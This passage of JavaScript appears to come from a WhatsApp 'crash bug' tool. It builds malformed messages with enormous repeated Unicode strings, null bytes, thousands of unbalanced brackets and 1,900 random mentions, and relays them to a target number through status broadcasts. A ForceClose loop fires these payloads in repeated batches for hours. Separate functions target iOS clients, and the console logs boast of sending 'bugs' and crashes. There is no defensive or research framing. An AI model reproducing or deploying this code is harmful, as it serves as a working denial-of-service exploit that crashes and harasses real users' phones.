            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };


  let tmsg = await generateWAMessageFromContent(X, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: Math.floor(Math.random() * 99999),
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        quotedMessage: {
           imageMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
               mimetype: "image/jpeg",
               caption:"ោ៝".repeat(6000),
               fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
               fileLength: "19769",
               height: 354,
               width: 783,
               mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
               fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
               directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
               mediaKeyTimestamp: "1743225419",
               jpegThumbnail: null,
                scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                scanLengths: [2437, 17332],
                 contextInfo: {
                    isSampled: true,
                    participant: X,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9999,
                    isForwarded: true
                }
            }         
        },
        annotations: [
          {
            embeddedContent: { Sugandih },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  const msg = generateWAMessageFromContent(X, message, {});
  const msgg = generateWAMessageFromContent(X, tmsg, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
 
  await Ren.relayMessage("status@broadcast", msgg.message, {
    messageId: msgg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function boegProtocol(X) {
  try {
    let parse = false;
    let type = `image/webp`;

    if (11 > 9) {
      parse = parse ? false : true;
    }

    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      contextInfo: {
        participant: X,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
        ],
      },
    };

    let stickerMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
      fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
      fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
      mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
      mimetype: type,
      directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
      fileLength: {
        low: Math.floor(Math.random() * 1000),
        high: 0,
        unsigned: true,
      },
      mediaKeyTimestamp: {
        low: Math.floor(Math.random() * 1700000000),
        high: 0,
        unsigned: false,
      },
      firstFrameLength: 19904,
      firstFrameSidecar: "KN4kQ5pyABRAgA==",
      isAnimated: true,
      contextInfo: {
        participant: X,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
        ],
        groupMentions: [],
        entryPointConversionSource: "non_contact",
        entryPointConversionApp: "whatsapp",
        entryPointConversionDelaySeconds: 467593,
      },
      stickerSentTs: {
        low: Math.floor(Math.random() * -20000000),
        high: 555,
        unsigned: parse,
      },
      isAvatar: parse,
      isAiSticker: parse,
      isLottie: parse,
    };

    const msg1 = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { locationMessage }
      }
    }, {});

    const msg2 = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { stickerMessage }
      }
    }, {});

    for (const msg of [msg1, msg2]) {
      await Ren.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [X],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: X },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
      console.log(chalk.red(`Success Sent New Bulldozer to ${X}`));
    }

  } catch (err) {
    console.log("Error:", err);
  }
}
// Version 2
async function CorosuelInvis77(X, mention = true) {
  const videoServer = await prepareWAMessageMedia({
    video: {
      url: "https://files.catbox.moe/h3hf0r.mp4"
    }
  }, {
    upload: Ren.waUploadToServer
  });

  const cards = [];
  for (let i = 0; i < 10; i++) {
    cards.push({
      header: {
        ...videoServer,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "[".repeat(10000)
      }
    });
  }

  const etc = await generateWAMessageFromContent(X, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: `( 🍷HCS ) #Explanation`
          },
          carouselMessage: {
            cards
          },
          contextInfo: {
            mentionedJid: [X]
          }
        }
      }
    }
  }), {
    userJid: X,
    quoted: null
  });

  await Ren.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      X,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: etc.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
            content: undefined
          }
        ]
      }
    );
  }
  console.log(chalk.green('─────「 ⏤CrashSqlStatus Crashv4 」─────'));
}

async function restart(target, mention = true) {
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 3,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "\u0007".repeat(30000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [],
          }
        }
      }
    }
  }), { userJid: target });

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
            content: undefined
          }
        ]
      }
    );
  }
  console.log(chalk.green('─────「 ⏤WeForRen ! 」─────'));
}

async function ForceClose(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
         BlankPack(X),
          framersbug1(X),
          framersbug1(X),
          boegProtocol(X),
          SixDelay(X),
          SixDelay(X),
          NewBoeg(X),
          NewBoeg(X),
          boegProtocol(X),
          boegProtocol(X),
          restart(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/50 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 900);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Necro 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// -------------------( IOS FUNC )------------------------------ \\
const IosCrashByRXHL = async (X) => {
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }
    let msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});
    let extendMsg = {
      extendedTextMessage: {
        text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/rxhlvro - _ #",
        matchedText: "https://t.me/rxhlvro",
        description: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        title: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "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",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          extendMsg
        }
      }
    }, {});
    await Ren.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
    await Ren.relayMessage('status@broadcast', msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

async function InVsSwIphone(X) {
  try {
    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉" + "𝐒͢𝐢͡༑𝐗 𖣂 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ⍣ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗͡𝐨🎭" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "𖣂 ᳟༑ᜌ ̬  .....   ͠⤻𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ⃟༑" + "𖣂 ᳟༑ᜌ ̬  .....   ͠⤻𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ⃟༑" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }

    const msg = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { locationMessage }
      }
    }, {});

    await Ren.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: { jid: X },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

async function iNvsExTendIos(X) {
  try {
    const extendedTextMessage = {
      text: `𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉 \n\n 🫀 creditos : t.me/whiletry ` + CrLxTrava + LagHomeTravas,
      matchedText: "https://t.me/whiletry",
      description: "𝐒͢𝐢͡༑𝐗 𖣂 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ⍣ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗͡𝐨🎭" + "𑇂𑆵𑆴𑆿".repeat(150),
      title: "𝐒͢𝐢͡༑𝐗 ᭯ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ☇ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗፝𝐨〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
      previewType: "NONE",
      jpegThumbnail: "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